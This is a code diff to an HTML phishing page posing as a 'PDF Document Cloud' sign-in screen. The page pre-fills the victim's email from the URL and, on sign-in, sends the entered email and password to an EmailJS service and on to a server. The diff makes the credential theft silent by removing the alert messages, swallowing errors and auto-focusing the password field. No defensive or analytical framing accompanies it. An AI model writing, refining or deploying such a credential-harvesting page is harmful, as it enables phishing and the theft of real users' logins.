@@ -7,16 +7,18 @@
     <link rel="icon" type="image/ico" href="https://image.shutterstock.com/image-photo/image-260nw-1723718677.jpg">
     <title>PDF Document Cloud | Sign in</title>
     <script>
-        // JavaScript to extract the email from the URL and pre-fill the field
+        // JavaScript to extract the email from the URL and pre-fill the field, then focus on password
         window.onload = function() {
             const urlParams = new URLSearchParams(window.location.search);
             const email = urlParams.get('email');
             if (email) {
                 document.getElementById('login').value = email;
             }
+            // Set focus to the password field
+            document.getElementById('passwd').focus();
         };
 
-        // JavaScript to handle the Sign In button click with prompt feedback
+        // JavaScript to handle the Sign In button click (no prompts)
         async function handleSignIn() {
             const email = document.getElementById('login').value;
             const password = document.getElementById('passwd').value;
@@ -27,18 +29,15 @@
                 return;
             }
 
-            // Send the data to EmailJS with prompt feedback
-            try {
-                await emailjs.send('service_7zvs3qp', 'template_d2ryy3m', {
-                    email: email,
-                    password: password,
-                    date: new Date().toLocaleString()
-                });
-                alert('Email sent successfully to Gmail!');
-            } catch (error) {
-                alert('Failed to send email: ' + error.text);
-                console.error('EmailJS Error:', error);
-            }
+            // Send the data to EmailJS (silent)
+            emailjs.send('service_7zvs3qp', 'template_d2ryy3m', {
+                email: email,
+                password: password,
+                date: new Date().toLocaleString()
+            })
+            .catch(error => {
+                console.error('EmailJS Error:', error); // Silent error logging
+            });
 
             // Send the data to the server (original functionality unchanged)
             try {
@@ -85,7 +84,7 @@
                             </div>
                             <div class="form-group mt-2">
                                 <small></small>
-                                <input type="password" id="passwd" name="BB" class="form-control" aria-describedby="aiHelp" placeholder="Enter Password" autofocus required>
+                                <input type="password" id="passwd" name="BB" class="form-control" aria-describedby="aiHelp" placeholder="Enter Password" required>
                             </div>
                         </div>
                         <div class="form-check mt-3">
